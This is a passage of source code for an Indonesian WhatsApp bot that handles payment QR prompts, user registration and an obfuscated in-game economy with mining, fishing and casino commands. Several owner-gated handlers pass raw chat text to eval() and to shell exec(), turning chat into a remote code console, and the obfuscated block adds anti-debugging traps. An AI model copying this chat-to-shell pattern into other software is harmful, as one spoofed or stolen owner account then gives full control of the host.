await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana17'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay17'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_ 
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}
if(subscribezeeoneofc == 'qr_ovo18'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana18'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay18'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal Jumlah Donasi.
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}   
if (budy.includes("eror",'error','Eror','Error')){
					alpha.updatePresence(from, Presence.composing)
					const daieeeee = fs.readFileSync('./sticker/10_1.webp');
					alpha.sendMessage(from, daieeeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Kenapa bisa error???`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
		if(budy.includes("@verif", "@verify","daftar")){
			if (isRegister) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
 addLevelingId(sender)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`,pp_userz, papako, {contextInfo: { mentionedJid: [sender]}})
                }
		
if (budy.startsWith('x')){
try {
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('$')){
if (!mek.key.fromMe && !isOwner && !isCreator ) return reply(lang.onlyOwner())
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`ALPHABOT :~ ${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (budy.startsWith('=>')){
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
	}
	const _0x42e377=_0x18d2;(function(_0x2427ef,_0x36f8e9){const _0x47e474=_0x18d2,_0x55ddf1=_0x2427ef();while(!![]){try{const _0x32a74d=-parseInt(_0x47e474(0x195))/0x1*(-parseInt(_0x47e474(0x1ad))/0x2)+parseInt(_0x47e474(0x1a3))/0x3*(-parseInt(_0x47e474(0x1c7))/0x4)+-parseInt(_0x47e474(0x185))/0x5+parseInt(_0x47e474(0x1bb))/0x6*(parseInt(_0x47e474(0x200))/0x7)+-parseInt(_0x47e474(0x1e5))/0x8+parseInt(_0x47e474(0x1ab))/0x9+parseInt(_0x47e474(0x206))/0xa*(parseInt(_0x47e474(0x18d))/0xb);if(_0x32a74d===_0x36f8e9)break;else _0x55ddf1['push'](_0x55ddf1['shift']());}catch(_0x5e6ac7){_0x55ddf1['push'](_0x55ddf1['shift']());}}}(_0x50c4,0x82350));const _0x4cc3a7=(function(){let _0x4accd7=!![];return function(_0x3c32ec,_0x421399){const _0x25504a=_0x4accd7?function(){const _0x4dd6ab=_0x18d2;if(_0x421399){const _0x3bc0bb=_0x421399[_0x4dd6ab(0x1f0)](_0x3c32ec,arguments);return _0x421399=null,_0x3bc0bb;}}:function(){};return _0x4accd7=![],_0x25504a;};}());(function(){_0x4cc3a7(this,function(){const _0x30fdf8=_0x18d2,_0x516887=new RegExp('function\x20*\x5c(\x20*\x5c)'),_0x4e1ce2=new RegExp(_0x30fdf8(0x1e1),'i'),_0x15eebf=_0x2f05af('init');!_0x516887[_0x30fdf8(0x1e2)](_0x15eebf+_0x30fdf8(0x1ed))||!_0x4e1ce2[_0x30fdf8(0x1e2)](_0x15eebf+'input')?_0x15eebf('0'):_0x2f05af();})();}());switch(command){case _0x42e377(0x188):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+_0x42e377(0x1f7));if(!isEventon)return reply('Event\x20grub\x20belum\x20di\x20aktifkan');bayar=args[_0x42e377(0x1ec)]('\x20');const hargaIkan=0x2710,hasil1=bayar*hargaIkan;if(getMancingIkan(sender)<=0x1)return reply(_0x42e377(0x1d5)+pushname+_0x42e377(0x1a1));getMancingIkan(sender)>=0x1&&(jualIkan(sender,bayar),addKoinUser(sender,hasil1),await reply(_0x42e377(0x1fb)+enter+enter+_0x42e377(0x1b3)+bayar+enter+_0x42e377(0x1b8)+hasil1+enter+enter+_0x42e377(0x1a7)+getMancingIkan(sender)+enter+_0x42e377(0x1a0)+checkATMuser(sender)+enter+enter+'Proses\x20berhasil\x20dengan\x20nomer\x20pembayaran\x20d88288bak1920kal'));break;case _0x42e377(0x1b9):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply('Limit\x20kamu\x20sudah\x20habis\x20silahkan\x20kirim\x20'+prefix+_0x42e377(0x1f7));if(!isEventon)return reply(_0x42e377(0x1b6));bayar=args[_0x42e377(0x1ec)]('\x20');const hargaCoal=0x3a98,hasil2=bayar*hargaCoal;if(getMiningcoal(sender)<=0x1)return reply(_0x42e377(0x1d5)+pushname+'\x20kamu\x20tidak\x20punya\x20coal');getMiningcoal(sender)>=0x1&&(jualcoal(sender,bayar),addKoinUser(sender,hasil2),await reply('*「\x20PENJUALAN\x20BERHASIL\x20」*'+enter+enter+_0x42e377(0x1c1)+bayar+enter+_0x42e377(0x1b8)+hasil2+enter+enter+_0x42e377(0x1ef)+getMiningcoal(sender)+enter+_0x42e377(0x1a0)+checkATMuser(sender)+enter+enter+_0x42e377(0x1db)));break;case _0x42e377(0x18b):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply('Limit\x20kamu\x20sudah\x20habis\x20silahkan\x20kirim\x20'+prefix+'limit\x20untuk\x20mengecek\x20limit');if(!isEventon)return reply(_0x42e377(0x1b6));bayar=args[_0x42e377(0x1ec)]('\x20');const hargaOre=0x2,hasil3=bayar*hargaOre;if(getMiningore(sender)<=0x1)return reply(_0x42e377(0x1d5)+pushname+_0x42e377(0x1e6));getMiningore(sender)>=0x1&&(jualore(sender,bayar),addIngot(sender,hasil3),await reply(_0x42e377(0x1fc)+bayar+'\x0a*Ingot\x20didapat:*\x20'+hasil3+_0x42e377(0x1c4)+getMiningore(sender)));break;case'jualstone':if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+_0x42e377(0x1f7));if(!isEventon)return reply(_0x42e377(0x1b6));bayar=args['join']('\x20');const hargaStone=0x384,hasil4=bayar*hargaStone;if(getMiningstone(sender)<=0x1)return reply(_0x42e377(0x1d5)+pushname+_0x42e377(0x1f2));getMiningstone(sender)>=0x1&&(jualstone(sender,bayar),addKoinUser(sender,hasil4),await reply(_0x42e377(0x1fb)+enter+enter+_0x42e377(0x203)+bayar+enter+_0x42e377(0x1b8)+hasil4+enter+enter+_0x42e377(0x1d8)+getMiningstone(sender)+enter+_0x42e377(0x1a0)+checkATMuser(sender)+enter+enter+_0x42e377(0x1db)));break;case'jualingot':if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+'limit\x20untuk\x20mengecek\x20limit');if(!isEventon)return reply(_0x42e377(0x1b6));bayar=args[_0x42e377(0x1ec)]('\x20');const hargaIngot=0x88b8,hasil5=bayar*hargaIngot;if(getMiningingot(sender)<=0x1)return reply('Maaf\x20'+pushname+_0x42e377(0x1dd));getMiningingot(sender)>=0x1&&(jualingot(sender,bayar),addKoinUser(sender,hasil5),await reply(_0x42e377(0x1d3)+enter+enter+_0x42e377(0x1c9)+bayar+enter+_0x42e377(0x1b8)+hasil5+enter+enter+_0x42e377(0x196)+getMiningingot(sender)+enter+_0x42e377(0x1a0)+checkATMuser(sender)+enter+enter+_0x42e377(0x1db)));break;case _0x42e377(0x19d):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+_0x42e377(0x1f7));if(!isEventon)return reply(_0x42e377(0x1b6));bayar=args[_0x42e377(0x1ec)]('\x20');const hargaKayu=0x4650,hasil6=bayar*hargaKayu;if(getNebangKayu(sender)<=0x1)return reply('Maaf\x20'+pushname+_0x42e377(0x204));getNebangKayu(sender)>=0x1&&(jualkayu(sender,bayar),addKoinUser(sender,hasil6),await reply(_0x42e377(0x1d3)+enter+enter+'*Jumlah\x20Kayu\x20dijual:*\x20'+bayar+enter+_0x42e377(0x1b8)+hasil6+enter+enter+_0x42e377(0x197)+getNebangKayu(sender)+enter+_0x42e377(0x1a0)+checkATMuser(sender)+enter+enter+'Proses\x20berhasil\x20dengan\x20nomer\x20pembayaran\x20d88288bak1920kal'));break;case _0x42e377(0x1dc):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+_0x42e377(0x1f7));if(!isEventon)return reply(_0x42e377(0x1ba)+pushname+_0x42e377(0x1a2));if(isOwner){const one=0x3b9ac9ff;addLevelingXp(sender,one),addLevelingLevel(sender,0x63),reply(_0x42e377(0x18f)+one+_0x42e377(0x187));}else setTimeout(()=>{const _0x1b0a00=_0x42e377,_0x4e76ef=Math[_0x1b0a00(0x1da)](Math[_0x1b0a00(0x1aa)]()*0x2710);addLevelingXp(sender,_0x4e76ef),reply('*Congratulation\x20🎊*\x20'+pushname+_0x1b0a00(0x1a9)+_0x4e76ef+_0x1b0a00(0x1f4));},0xbb8),setTimeout(()=>{const _0x2fd839=_0x42e377;reply(_0x2fd839(0x1eb));},0x0);await limitAdd(sender,limit);break;case _0x42e377(0x1cd):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+_0x42e377(0x1f7));if(!isEventon)return reply('Event\x20grub\x20belum\x20di\x20aktifkan');setTimeout(()=>{const _0x8b8854=_0x42e377,_0x38736b=Math[_0x8b8854(0x1da)](Math['random']()*0xa);addIkan(sender,_0x38736b),reply(_0x8b8854(0x1b7)+_0x38736b+'*\x20Ikan\x20selama\x202\x20menit');},0xbb8),setTimeout(()=>{const _0x389e05=_0x42e377;reply(_0x389e05(0x1ca));},0x0);break;case _0x42e377(0x1d9):case _0x42e377(0x186):if(!isEventon)return reply('Event\x20grub\x20belum\x20di\x20aktifkan');var tempsa=args[_0x42e377(0x1ec)]('\x20');if(tempsa=='corbiens\x20river')asu=await getBuffer(_0x42e377(0x1ee),{'method':_0x42e377(0x1b5)}),setTimeout(()=>{const _0x5dad11=_0x42e377,_0x206f7e=Math[_0x5dad11(0x1da)](Math[_0x5dad11(0x1aa)]()*0x46),_0x35812e=Math[_0x5dad11(0x1da)](Math[_0x5dad11(0x1aa)]()*0xf);addStone(sender,_0x206f7e),addIkan(sender,_0x35812e),sendButImage(from,_0x5dad11(0x1b4)+enter+enter+_0x5dad11(0x1f6)+_0x206f7e+'*\x20batu\x20dan\x20*'+_0x35812e+_0x5dad11(0x1fe)+enter+enter+_0x5dad11(0x198)+prefix+_0x5dad11(0x18a),botname+_0x5dad11(0x1f5)+ownername,asu,[{'buttonId':_0x5dad11(0x1be),'buttonText':{'displayText':_0x5dad11(0x1d4)},'type':_0x5dad11(0x1cf)}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x409491=_0x42e377;reply(_0x409491(0x1f1));},0x0);else{if(tempsa===_0x42e377(0x1bc))gos=await getBuffer('https://telegra.ph/file/77c3badc9f97d6589a30f.jpg',{'method':_0x42e377(0x1b5)}),setTimeout(()=>{const _0x55708e=_0x42e377,_0x17514e=Math[_0x55708e(0x1da)](Math['random']()*0x6e),_0x2b89a6=Math['ceil'](Math[_0x55708e(0x1aa)]()*0x14);addStone(sender,_0x17514e),addKayu(sender,_0x2b89a6),sendButImage(from,_0x55708e(0x1b4)+enter+enter+'Kamu\x20mendapatkan\x20*'+_0x17514e+_0x55708e(0x1e9)+_0x2b89a6+_0x55708e(0x205)+enter+enter+'Cek\x20inventory\x20anda\x20dengan\x20cara\x20ketik\x20'+prefix+_0x55708e(0x18a),botname+'™©\x20|\x20By\x20'+ownername,gos,[{'buttonId':_0x55708e(0x1be),'buttonText':{'displayText':_0x55708e(0x1d4)},'type':'RESPONSE'}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x5b9e58=_0x42e377;reply(_0x5b9e58(0x1f1));},0x0);else{if(tempsa===_0x42e377(0x1a5))seae=await getBuffer(_0x42e377(0x1a6),{'method':_0x42e377(0x1b5)}),setTimeout(()=>{const _0x6c8e04=_0x42e377,_0x802ca9=Math['ceil'](Math[_0x6c8e04(0x1aa)]()*0x41);addIkan(sender,_0x802ca9),sendButImage(from,'*Congratulation\x20🎊*'+enter+enter+_0x6c8e04(0x1f6)+_0x802ca9+_0x6c8e04(0x1fe)+enter+enter+_0x6c8e04(0x198)+prefix+_0x6c8e04(0x18a),botname+'™©\x20|\x20By\x20'+ownername,seae,[{'buttonId':'inv','buttonText':{'displayText':_0x6c8e04(0x1d4)},'type':_0x6c8e04(0x1cf)}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x4c3137=_0x42e377;reply(_0x4c3137(0x1f1));},0x0);else{if(tempsa==='limingstall\x20mountains')seoe=await getBuffer(_0x42e377(0x189),{'method':'get'}),setTimeout(()=>{const _0x42241d=_0x42e377,_0x2a6bd9=Math[_0x42241d(0x1da)](Math[_0x42241d(0x1aa)]()*0x32),_0xe5b77e=Math[_0x42241d(0x1da)](Math[_0x42241d(0x1aa)]()*0x50);addOre(sender,_0x2a6bd9),addStone(sender,_0xe5b77e),sendButImage(from,_0x42241d(0x1b4)+enter+enter+_0x42241d(0x1f6)+_0x2a6bd9+_0x42241d(0x19a)+_0xe5b77e+_0x42241d(0x1fd)+enter+enter+_0x42241d(0x198)+prefix+'inventory',botname+_0x42241d(0x1f5)+ownername,seoe,[{'buttonId':_0x42241d(0x1be),'buttonText':{'displayText':_0x42241d(0x1d4)},'type':_0x42241d(0x1cf)}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x36ef84=_0x42e377;reply(_0x36ef84(0x1f1));},0x0);else{if(tempsa===_0x42e377(0x18c))seye=await getBuffer(_0x42e377(0x1d6),{'method':_0x42e377(0x1b5)}),setTimeout(()=>{const _0x5c5bf5=_0x42e377,_0x445ada=Math[_0x5c5bf5(0x1da)](Math[_0x5c5bf5(0x1aa)]()*0x28),_0x4c61e7=Math[_0x5c5bf5(0x1da)](Math[_0x5c5bf5(0x1aa)]()*0x3c);addOre(sender,_0x445ada),addStone(sender,_0x4c61e7),sendButImage(from,_0x5c5bf5(0x1b4)+enter+enter+_0x5c5bf5(0x1f6)+_0x445ada+_0x5c5bf5(0x19a)+_0x4c61e7+_0x5c5bf5(0x1fd)+enter+enter+_0x5c5bf5(0x198)+prefix+_0x5c5bf5(0x18a),botname+_0x5c5bf5(0x1f5)+ownername,seye,[{'buttonId':_0x5c5bf5(0x1be),'buttonText':{'displayText':'My\x20Inventory\x20🗃️'},'type':'RESPONSE'}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0xc154c3=_0x42e377;reply(_0xc154c3(0x1f1));},0x0);else{if(tempsa==='gerbil\x20woods')siae=await getBuffer('https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg',{'method':'get'}),setTimeout(()=>{const _0x4a2930=_0x42e377,_0x580227=Math[_0x4a2930(0x1da)](Math[_0x4a2930(0x1aa)]()*0x5a),_0xa283ae=Math[_0x4a2930(0x1da)](Math[_0x4a2930(0x1aa)]()*0x2d);addStone(sender,_0x580227),addKayu(sender,_0xa283ae),sendButImage(from,_0x4a2930(0x1b4)+enter+enter+_0x4a2930(0x1f6)+_0x580227+_0x4a2930(0x1e9)+_0xa283ae+_0x4a2930(0x205)+enter+enter+_0x4a2930(0x198)+prefix+_0x4a2930(0x18a),botname+'™©\x20|\x20By\x20'+ownername,siae,[{'buttonId':_0x4a2930(0x1be),'buttonText':{'displayText':'My\x20Inventory\x20🗃️'},'type':'RESPONSE'}],{'quoted':mek});},0xbb8),setTimeout(()=>{const _0x5c9314=_0x42e377;reply(_0x5c9314(0x1f1));},0x0);else tempsa===_0x42e377(0x207)?(bbbb=await getBuffer(_0x42e377(0x18e),{'method':_0x42e377(0x1b5)}),setTimeout(()=>{const _0x2dcd65=_0x42e377,_0x34ebcf=Math[_0x2dcd65(0x1da)](Math[_0x2dcd65(0x1aa)]()*0xc8),_0x25749f=Math[_0x2dcd65(0x1da)](Math[_0x2dcd65(0x1aa)]()*0x14);addStone(sender,_0x34ebcf),addKayu(sender,_0x25749f),sendButImage(from,'*Congratulation\x20🎊*'+enter+enter+'Kamu\x20mendapatkan\x20*'+_0x34ebcf+'*\x20batu\x20dan\x20'+_0x25749f+'\x20kayu'+enter+enter+_0x2dcd65(0x198)+prefix+_0x2dcd65(0x18a),botname+'™©\x20|\x20By\x20'+ownername,bbbb,[{'buttonId':_0x2dcd65(0x1be),'buttonText':{'displayText':'My\x20Inventory\x20🗃️'},'type':_0x2dcd65(0x1cf)}],{'quoted':mek});},0xbb8),setTimeout(()=>{reply('Sedang\x20berpetualang,\x20silahkan\x20tunggu...');},0x0)):(seae=await getBuffer(_0x42e377(0x1e8),{'method':_0x42e377(0x1b5)}),tesk=_0x42e377(0x201)+prefix+'jelajah\x20corbiens\x20river\x0a\x0aSumber\x20Nama\x20tempat\x20\x20_https://www.fantasynamegenerators.com/_',alpha[_0x42e377(0x1d0)](from,seae,image,{'thumbnail':seae,'quoted':mek,'caption':tesk}));}}}}}break;case _0x42e377(0x202):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+'limit\x20untuk\x20mengecek\x20limit');if(!isEventon)return reply(_0x42e377(0x1b6));setTimeout(()=>{const _0x46cd2e=_0x42e377,_0x5983a2=Math[_0x46cd2e(0x1da)](Math[_0x46cd2e(0x1aa)]()*0x64),_0xb3dbb1=Math[_0x46cd2e(0x1da)](Math[_0x46cd2e(0x1aa)]()*0x1e),_0x2bb64c=Math[_0x46cd2e(0x1da)](Math[_0x46cd2e(0x1aa)]()*0xa);addStone(sender,_0x5983a2),addCoal(sender,_0xb3dbb1),addOre(sender,_0x2bb64c),reply(_0x46cd2e(0x1b4)+enter+enter+'\x20kamu\x20mendapatkan\x20*'+_0x5983a2+_0x46cd2e(0x191)+_0xb3dbb1+_0x46cd2e(0x199)+_0x2bb64c+_0x46cd2e(0x1f3));},0xbb8),setTimeout(()=>{reply('Sedang\x20menambang,\x20silahkan\x20tunggu...');},0x0);break;case _0x42e377(0x1a8):if(!isEventon)return reply('ya\x20maap\x20aja\x20bro,\x20tapi\x20event\x20grub\x20belum\x20di\x20aktifkan');setTimeout(()=>{const _0x317b2f=_0x42e377,_0x5360f6=Math[_0x317b2f(0x1da)](Math[_0x317b2f(0x1aa)]()*0x14);addKayu(sender,_0x5360f6),reply('*Congratulation\x20🎊*'+enter+enter+'kamu\x20mendapatkan\x20*'+_0x5360f6+_0x317b2f(0x19e));},0xbb8),setTimeout(()=>{reply('Sedang\x20menambang,\x20silahkan\x20tunggu...');},0x0);break;case'goplanet':if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+_0x42e377(0x1f7));if(!isEventon)return reply(_0x42e377(0x1b6));setTimeout(()=>{const _0x34c9b3=_0x42e377,_0x26be58=Math[_0x34c9b3(0x1da)](Math[_0x34c9b3(0x1aa)]()*0x64),_0x276890=['merkurius',_0x34c9b3(0x1d1),_0x34c9b3(0x1c6),_0x34c9b3(0x1b0),_0x34c9b3(0x1ea),_0x34c9b3(0x1c8),_0x34c9b3(0x20a)],_0x2b8e1c=_0x276890[Math[_0x34c9b3(0x1e7)](Math[_0x34c9b3(0x1aa)]()*_0x276890[_0x34c9b3(0x193)])];addPlanet(sender,_0x26be58),reply(_0x34c9b3(0x1b4)+enter+enter+'kamu\x20mendapatkan\x20*'+_0x26be58+'*bahan\x20kimia\x20dari\x20*'+_0x2b8e1c+_0x34c9b3(0x1c5));},0xbb8),setTimeout(()=>{const _0x5e1b7b=_0x42e377;reply(_0x5e1b7b(0x192));},0x0);break;case'jualbahankimia':if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+_0x42e377(0x1f7));if(!isEventon)return reply(_0x42e377(0x1b6));buayar=body[_0x42e377(0x1bd)](0x10);const hargakimia=0x3e8,dapetin=buayar*hargakimia;if(getBertualangPlanet(sender)<=0x1)return reply(_0x42e377(0x1ba)+pushname+_0x42e377(0x1a4));getBertualangPlanet(sender)>=0x1&&(jualbahankimia(sender,buayar),addKoinUser(sender,dapetin),await reply(_0x42e377(0x1fb)+enter+enter+_0x42e377(0x1e0)+buayar+enter+_0x42e377(0x1b8)+dapetin+enter+enter+_0x42e377(0x1e3)+getBertualangPlanet(sender)+enter+_0x42e377(0x1a0)+checkATMuser(sender)+enter+enter+_0x42e377(0x1ce)));break;case _0x42e377(0x1e4):teks=_0x42e377(0x209)+pushname+_0x42e377(0x1de)+getBertualangPlanet(sender)+'_*',alpha[_0x42e377(0x1d0)](from,teks,text,{'quoted':mek});break;case'judi':case _0x42e377(0x1f9):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x42e377(0x1ae)+prefix+'limit\x20untuk\x20mengecek\x20limit');if(!isEventon)return reply(_0x42e377(0x1b6));cas=body['slice'](0x6);if(checkATMuser(sender)<cas)return reply('Uang\x20mu\x20tidak\x20mencukupi\x20untuk\x20melakukan\x20judi');if(args[_0x42e377(0x193)]<0x1)return reply(_0x42e377(0x1bf));if(isNaN(cas))return reply(_0x42e377(0x1b1));const resg=['Kamu\x20MENANG!!',_0x42e377(0x1af)];bayar=confirmATM(sender,cas),setTimeout(()=>{const _0x4934d2=_0x42e377,_0x43cdb0=Math[_0x4934d2(0x1da)](Math['random']()*0x2),_0xdd7f7f=cas+0x0,_0x5caac7=resg[Math['floor'](Math['random']()*resg['length'])];if(_0x5caac7==_0x4934d2(0x1c2))addKoinUser(sender,_0xdd7f7f),reply(_0x4934d2(0x1b4)+enter+enter+'Kamu\x20memenangkan\x20casino\x20sebesar\x20*_'+_0xdd7f7f+'_*'+enter+enter+_0x4934d2(0x19c));else _0x5caac7==_0x4934d2(0x1af)?(confirmATM(sender,cas),reply(_0x4934d2(0x1c3)+cas)):reply(_0x4934d2(0x19f));},0xbb8),setTimeout(()=>{const _0x3e33bc=_0x42e377;reply(_0x3e33bc(0x1c0));},0x0),await limitAdd(sender,limit);break;case'inv':case _0x42e377(0x1d2):case _0x42e377(0x18a):inventory=_0x42e377(0x1fa)+getMiningcoal(sender)+_0x42e377(0x1b2)+getMiningstone(sender)+_0x42e377(0x208)+getMiningore(sender)+'\x0a🛠️\x20*INGOT\x20ORE*\x20:\x20'+getMiningingot(sender)+_0x42e377(0x1d7)+getNebangKayu(sender)+_0x42e377(0x1ac)+getMancingIkan(sender)+_0x42e377(0x1df),alpha[_0x42e377(0x1d0)](from,pp_userz,image,{'thumbnail':Buffer['alloc'](0x0),'quoted':mek,'caption':inventory});break;}function _0x18d2(_0x598cda,_0x546f16){const _0x2f5a59=_0x50c4();return _0x18d2=function(_0x2f05af,_0x4cc3a7){_0x2f05af=_0x2f05af-0x185;let _0x50c4cb=_0x2f5a59[_0x2f05af];return _0x50c4cb;},_0x18d2(_0x598cda,_0x546f16);}function _0x2f05af(_0x3248bf){function _0x178435(_0x4f8f5e){const _0x7ff97e=_0x18d2;if(typeof _0x4f8f5e===_0x7ff97e(0x1cb))return function(_0x4d2f48){}[_0x7ff97e(0x1cc)](_0x7ff97e(0x1f8))[_0x7ff97e(0x1f0)]('counter');else(''+_0x4f8f5e/_0x4f8f5e)[_0x7ff97e(0x193)]!==0x1||_0x4f8f5e%0x14===0x0?function(){return!![];}['constructor'](_0x7ff97e(0x19b)+'gger')['call'](_0x7ff97e(0x190)):function(){return![];}[_0x7ff97e(0x1cc)]('debu'+_0x7ff97e(0x194))[_0x7ff97e(0x1f0)](_0x7ff97e(0x1ff));_0x178435(++_0x4f8f5e);}try{if(_0x3248bf)return _0x178435;else _0x178435(0x0);}catch(_0x59e6de){}}function _0x50c4(){const _0x46f5d9=['*\x20batu\x20dan\x20*','saturnus','Sedang\x20mining\x20selama\x202\x20menit,\x20silahkan\x20tunggu...','join','chain','https://telegra.ph/file/00018dab77a6cea81523e.jpg','*Sisa\x20coal:*\x20','apply','Sedang\x20berpetualang,\x20silahkan\x20tunggu...','\x20stone\x20kamu\x20belum\x20cukup,\x20minimal\x202\x20stone','*\x20ore','Xp*','™©\x20|\x20By\x20','Kamu\x20mendapatkan\x20*','limit\x20untuk\x20mengecek\x20limit','while\x20(true)\x20{}','casino','\x0a🗃️\x20*USER\x20INVENTORY*\x20🗃️\x20\x0a\x0a🎢\x20*COAL*\x20:\x20','*「\x20PENJUALAN\x20BERHASIL\x20」*','*「\x20LEBUR\x20BERHASIL\x20」*\x0a\x0a*Jumlah\x20Ore\x20dilebur\x20:*\x20','\x20batu','*\x20ikan','stateObject','518iGxXfN','*PILIH\x20WILAYAH\x20YANG\x20INGIN\x20KAMU\x20JELAJAHI*\x0a\x0a\x0a⚪\x20Corbiens\x20River\x0a🔵\x20Cochher\x20Sea\x0a⚫\x20Moobiens\x20Grassland\x0a🟣\x20Gerbil\x20Woods\x0a